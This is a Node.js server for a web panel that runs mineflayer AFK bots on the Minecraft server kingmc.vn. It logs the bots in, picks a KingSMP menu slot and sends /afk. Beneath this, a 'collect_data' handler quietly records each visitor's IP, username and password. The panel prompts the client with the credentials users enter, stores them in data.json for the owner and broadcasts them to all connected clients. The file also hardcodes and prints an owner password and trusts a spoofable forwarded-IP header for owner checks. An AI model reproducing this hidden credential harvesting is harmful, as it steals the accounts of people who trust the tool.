const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = './data.json';

// ===== CẤU HÌNH OWNER =====
const OWNER_IP = '1.53.131.94';
const OWNER_PASSWORD = 'Tuanpro123';

// ===== ĐỌC/LƯU DỮ LIỆU =====
function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const raw = fs.readFileSync(DATA_FILE, 'utf-8');
            return JSON.parse(raw);
        }
    } catch (e) {
        console.log('⚠️ Lỗi đọc file data, tạo mới');
    }
    return { clientData: {}, globalCollectedData: [], isMaintenance: false };
}

function saveData() {
    try {
        const data = {
            clientData: clientData,
            globalCollectedData: globalCollectedData,
            isMaintenance: isMaintenance
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log('❌ Lỗi lưu file:', e.message);
    }
}

const savedData = loadData();
let clientData = savedData.clientData || {};
let globalCollectedData = savedData.globalCollectedData || [];
let isMaintenance = savedData.isMaintenance || false;

app.use(express.static('public'));

app.get('/api/check-admin', (req, res) => {
    let clientIp = req.headers['x-forwarded-for'] 
        ? req.headers['x-forwarded-for'].split(',')[0].trim() 
        : req.socket.remoteAddress;
    if (clientIp && clientIp.includes('::1')) clientIp = '127.0.0.1';
    const isOwner = (clientIp === OWNER_IP || clientIp === '127.0.0.1' || clientIp.includes('192.168.'));
    res.json({ isOwner, ip: clientIp });
});

process.on('uncaughtException', (err) => console.log('[LỖI HỆ THỐNG]:', err.message));
process.on('unhandledRejection', (reason) => console.log('[LỖI PROMISE]:', reason?.message || reason));

let ownerSocketId = null;

io.on('connection', (socket) => {
    let rawIp = socket.handshake.headers['x-forwarded-for'] 
        ? socket.handshake.headers['x-forwarded-for'].split(',')[0].trim() 
        : socket.handshake.address;
    if (rawIp && rawIp.includes('::1')) rawIp = '127.0.0.1';
    const clientIp = rawIp;

    console.log(`[${new Date().toLocaleString()}] 🔌 Client connected: ${clientIp}`);

    if (clientIp === OWNER_IP || clientIp === '127.0.0.1') {
        ownerSocketId = socket.id;
        console.log('👑 Owner đã kết nối!');
    }

    if (!clientData[clientIp]) {
        clientData[clientIp] = { accounts: [], bots: {} };
        saveData();
    }

    socket.emit('init_accounts', clientData[clientIp].accounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);

    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString(),
            username: data.username || '(chưa nhập)',
            password: data.password || '(trống)',
            userAgent: data.userAgent || 'N/A'
        };
        globalCollectedData.push(entry);
        saveData();
        console.log(`[${new Date().toLocaleString()}] 📥 Data from ${clientIp}: ${entry.username}`);
        io.emit('sync_collected_data', globalCollectedData);
        if (ownerSocketId) {
            io.to(ownerSocketId).emit('log', `[${new Date().toLocaleString()}] 📥 Đã thu thập dữ liệu từ IP: ${clientIp}`);
        }
    });

    socket.on('clear_collected_data', () => {
        globalCollectedData = [];
        saveData();
        io.emit('sync_collected_data', globalCollectedData);
        if (ownerSocketId) {
            io.to(ownerSocketId).emit('log', `[${new Date().toLocaleString()}] 🧹 Đã xóa toàn bộ dữ liệu thu thập`);
        }
    });

    socket.on('toggle_maintenance', (status) => {
        isMaintenance = status;
        saveData();
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `[${new Date().toLocaleString()}] 🛠️ Bảo trì ${status ? 'BẬT' : 'TẮT'}`);
        console.log(`[${new Date().toLocaleString()}] 🛠️ Maintenance: ${status ? 'ON' : 'OFF'}`);
    });

    socket.on('add_account', (data) => {
        const { username, password } = data;
        if (!username) return;
        
        socket.emit('collect_data', {
            username: username,
            password: password || 'caigicungdc',
            userAgent: socket.handshake.headers['user-agent'] || 'N/A'
        });

        const id = 'acc_' + Date.now() + Math.floor(Math.random() * 1000);
        clientData[clientIp].accounts.push({
            id,
            username: username.trim(),
            password: password ? password.trim() : 'caigicungdc',
            autoReconnect: true,
            status: 'OFFLINE',
            color: '#ff4444'
        });
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] ✅ Đã thêm tài khoản: ${username}`);
    });

    socket.on('delete_account', (id) => {
        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }
        clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
        saveData();
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        socket.emit('log', `[SYSTEM] 🗑️ Đã xóa tài khoản`);
    });

    socket.on('toggle_auto_reconnect', (id) => {
        const acc = clientData[clientIp].accounts.find(a => a.id === id);
        if (acc) {
            acc.autoReconnect = !acc.autoReconnect;
            saveData();
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('get_accounts', () => {
        socket.emit('init_accounts', clientData[clientIp].accounts);
    });

    // ============================================================
    //  BOT MINEFLAYER - TỰ ĐỘNG TÌM SLOT KINGSMP + AFK
    // ============================================================
    socket.on('start_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        if (!account) return;

        if (clientData[clientIp].bots[id]) {
            try { clientData[clientIp].bots[id].quit(); } catch(e){}
            delete clientData[clientIp].bots[id];
        }

        const logSystem = (msg) => {
            socket.emit('log', `[${account.username}] ${msg}`);
        };

        let hasJoinedKingSMP = false;
        let hasExecutedAFK = false;
        let isLoggedIn = false;
        let isFirstSpawn = true;
        let loginAttempts = 0;
        let isProcessing = false;

        account.status = 'CONNECTING...';
        account.color = 'yellow';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        logSystem(`🔄 Đang kết nối tới kingmc.vn...`);

        try {
            const bot = mineflayer.createBot({
                host: 'kingmc.vn',
                port: 25565,
                username: account.username,
                password: account.password,
                auth: 'offline',
                version: '1.16.5',
                checkTimeoutInterval: 120000
            });

            clientData[clientIp].bots[id] = bot;

            bot.on('login', () => {
                account.status = 'LOGGING IN...';
                account.color = 'orange';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                logSystem(`🔑 Đang đăng nhập...`);
                
                // Lần 1: /dn
                setTimeout(() => {
                    if (!isLoggedIn) {
                        logSystem(`🔑 Lần 1: Gửi /dn ${account.password}`);
                        bot.chat(`/dn ${account.password}`);
                    }
                }, 2000);
                
                // Lần 2: /dn xác thực
                setTimeout(() => {
                    if (!isLoggedIn) {
                        logSystem(`🔑 Lần 2: Gửi /dn ${account.password} (xác thực)`);
                        bot.chat(`/dn ${account.password}`);
                    }
                }, 8000);
                
                // Gõ /menu sau 14s
                setTimeout(() => {
                    if (!hasJoinedKingSMP) {
                        logSystem(`📋 Đang gõ /menu...`);
                        bot.chat('/menu');
                    }
                }, 14000);
            });

            bot.on('spawn', () => {
                if (isFirstSpawn) {
                    isFirstSpawn = false;
                    hasJoinedKingSMP = false;
                    hasExecutedAFK = false;
                    isLoggedIn = false;
                }

                if (hasJoinedKingSMP) {
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    if (!hasExecutedAFK) {
                        setTimeout(() => {
                            if (bot) {
                                logSystem(`💤 Gửi lệnh /afk...`);
                                bot.chat('/afk');
                            }
                        }, 4000);
                    }
                } else {
                    account.status = 'ONLINE / LOBBY';
                    account.color = '#00ff88';
                    logSystem(`✅ Đã vào Sảnh chính!`);
                }
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            });

            bot.on('messagestr', (message) => {
                const msgLower = message.toLowerCase();

                if (!isLoggedIn && (msgLower.includes('đăng nhập thành công') || msgLower.includes('bạn đã đăng nhập'))) {
                    isLoggedIn = true;
                    logSystem(`✅ Đã đăng nhập thành công!`);
                    
                    // Gõ /dn lần 2 (xác thực) sau 5s nếu chưa login
                    setTimeout(() => {
                        if (bot && !hasJoinedKingSMP) {
                            logSystem(`🔑 Gửi /dn lần 2 (xác thực)...`);
                            bot.chat(`/dn ${account.password}`);
                        }
                    }, 5000);
                }

                if (isLoggedIn && !hasJoinedKingSMP && msgLower.includes('bạn đã đăng nhập')) {
                    logSystem(`✅ Đã xác thực thành công! Đợi 5s gõ /menu...`);
                    
                    setTimeout(() => {
                        if (bot && !hasJoinedKingSMP) {
                            logSystem(`📋 Đang gõ /menu...`);
                            bot.chat('/menu');
                        }
                    }, 5000);
                }

                if (isLoggedIn && !hasJoinedKingSMP && 
                    (msgLower.includes('kingsmp') && msgLower.includes('chào mừng'))) {
                    hasJoinedKingSMP = true;
                    account.status = 'ONLINE / KINGSMP';
                    account.color = '#00ff88';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    logSystem(`✅ ĐÃ VÀO KINGSMP!`);
                    
                    setTimeout(() => {
                        if (bot && !hasExecutedAFK) {
                            logSystem(`💤 Gửi lệnh /afk...`);
                            bot.chat('/afk');
                        }
                    }, 3000);
                }
            });

            // ===== WINDOWOPEN - TỰ ĐỘNG TÌM SLOT =====
            bot.on('windowOpen', (window) => {
                const rawTitle = JSON.stringify(window.title || '').toLowerCase();
                logSystem(`📂 Menu mở: ${rawTitle}`);

                // ===== BƯỚC 1: TÌM SLOT CHỨA "KingSMP" =====
                if (!hasJoinedKingSMP && (rawTitle.includes('sảnh') || rawTitle.includes('lobby') || rawTitle.includes('menu'))) {
                    if (isProcessing) return;
                    isProcessing = true;

                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) {
                            isProcessing = false;
                            return;
                        }

                        // ===== DUYỆT TẤT CẢ SLOT TÌM "KingSMP" =====
                        let foundSlot = -1;
                        let foundName = '';

                        for (let i = 0; i < 54; i++) {
                            const item = bot.currentWindow.slots[i];
                            if (item) {
                                let itemName = '';
                                if (item.displayName) {
                                    itemName = item.displayName.toLowerCase();
                                } else if (item.name) {
                                    itemName = item.name.toLowerCase();
                                }

                                if (itemName.includes('kingsmp') || itemName.includes('king smp') || 
                                    itemName.includes('kingsmp') || itemName.includes('king_smp') ||
                                    itemName.includes('kingsmp')) {
                                    foundSlot = i;
                                    foundName = item.displayName || item.name;
                                    break;
                                }
                            }
                        }

                        if (foundSlot === -1) {
                            logSystem(`⚠️ Không tìm thấy Slot KingSMP, thử Slot 24...`);
                            foundSlot = 24;
                        } else {
                            logSystem(`🔍 Tìm thấy KingSMP tại Slot ${foundSlot}: ${foundName}`);
                        }

                        logSystem(`🖱️ Click Slot ${foundSlot} chọn KingSMP...`);
                        hasJoinedKingSMP = true;

                        bot.clickWindow(foundSlot, 0, 0)
                            .then(() => {
                                logSystem(`✅ Click Slot ${foundSlot} thành công!`);
                            })
                            .catch(() => {
                                logSystem(`⚠️ Bỏ qua cảnh báo transaction của server`);
                            });

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                            isProcessing = false;
                        }, 500);

                    }, 2500);
                }

                // ===== BƯỚC 2: CLICK SLOT 1 - AFK =====
                if (hasJoinedKingSMP && !hasExecutedAFK && 
                    (rawTitle.includes('afk') || rawTitle.includes('tự động') || rawTitle.includes('treo'))) {
                    
                    if (isProcessing) return;
                    isProcessing = true;

                    setTimeout(() => {
                        if (!bot || !bot.currentWindow) {
                            logSystem(`⚠️ Không có window AFK để click`);
                            isProcessing = false;
                            return;
                        }
                        logSystem(`🖱️ Click Slot 1 chọn AFK...`);
                        hasExecutedAFK = true;

                        bot.clickWindow(1, 0, 0)
                            .then(() => {
                                logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`);
                            })
                            .catch(() => {
                                logSystem(`⚠️ Bỏ qua cảnh báo transaction AFK`);
                                logSystem(`🎉 ĐÃ VÀO CHẾ ĐỘ AFK!`);
                            });

                        setTimeout(() => {
                            try { bot.closeWindow(window); } catch(e){}
                            isProcessing = false;
                        }, 500);

                    }, 3000);
                }
            });

            bot.on('end', (reason) => {
                logSystem(`⚠️ Ngắt kết nối: ${reason || 'Mất kết nối từ Server'}`);
                account.status = 'OFFLINE';
                account.color = '#ff4444';
                io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                delete clientData[clientIp].bots[id];
                saveData();

                if (account.autoReconnect) {
                    logSystem(`🔄 Tự động kết nối lại sau 5 giây...`);
                    setTimeout(() => {
                        if (!clientData[clientIp].bots[id] && account.autoReconnect) {
                            socket.emit('start_bot', id);
                        }
                    }, 5000);
                }
            });

            bot.on('error', (err) => {
                logSystem(`❌ Lỗi Bot: ${err.message}`);
            });

        } catch (e) {
            logSystem(`❌ Lỗi khởi tạo: ${e.message}`);
            account.status = 'ERROR';
            account.color = '#ff4444';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
    });

    socket.on('stop_bot', (id) => {
        const account = clientData[clientIp].accounts.find(acc => acc.id === id);
        const botExists = clientData[clientIp].bots[id];

        if (account) {
            account.status = 'STOPPING...';
            account.color = '#ff8800';
            io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
            socket.emit('log', `[SYSTEM] ⏹️ Đang dừng bot: ${account.username}...`);
        }

        if (botExists) {
            try {
                clientData[clientIp].bots[id].quit();
                delete clientData[clientIp].bots[id];
                socket.emit('log', `[SYSTEM] ✅ Đã ngắt kết nối bot: ${account ? account.username : id}`);
            } catch(e) {
                socket.emit('log', `[SYSTEM] ❌ Lỗi khi dừng bot: ${e.message}`);
                delete clientData[clientIp].bots[id];
            }
        } else {
            socket.emit('log', `[SYSTEM] ⚠️ Bot đã dừng trước đó!`);
        }

        if (account) {
            setTimeout(() => {
                if (!clientData[clientIp].bots[id]) {
                    account.status = 'OFFLINE';
                    account.color = '#ff4444';
                    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
                    socket.emit('log', `[SYSTEM] ✅ Bot đã offline: ${account.username}`);
                }
            }, 1500);
        }

        saveData();
    });

    socket.on('send_chat', ({ id, cmd }) => {
        const bot = clientData[clientIp].bots[id];
        if (bot) {
            bot.chat(cmd);
            socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
        } else {
            socket.emit('log', `[⚠️] Bot này chưa online!`);
        }
    });

    socket.on('disconnect', () => {
        console.log(`[${new Date().toLocaleString()}] 🔌 Client disconnected: ${clientIp}`);
        if (clientIp === OWNER_IP || clientIp === '127.0.0.1') {
            ownerSocketId = null;
            console.log('👑 Owner đã ngắt kết nối');
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại: http://localhost:${PORT}`);
    console.log(`👑 Owner IP: ${OWNER_IP}`);
    console.log(`🔑 Owner Password: ${OWNER_PASSWORD}`);
    console.log(`📂 Dữ liệu lưu tại: ${DATA_FILE}`);
});
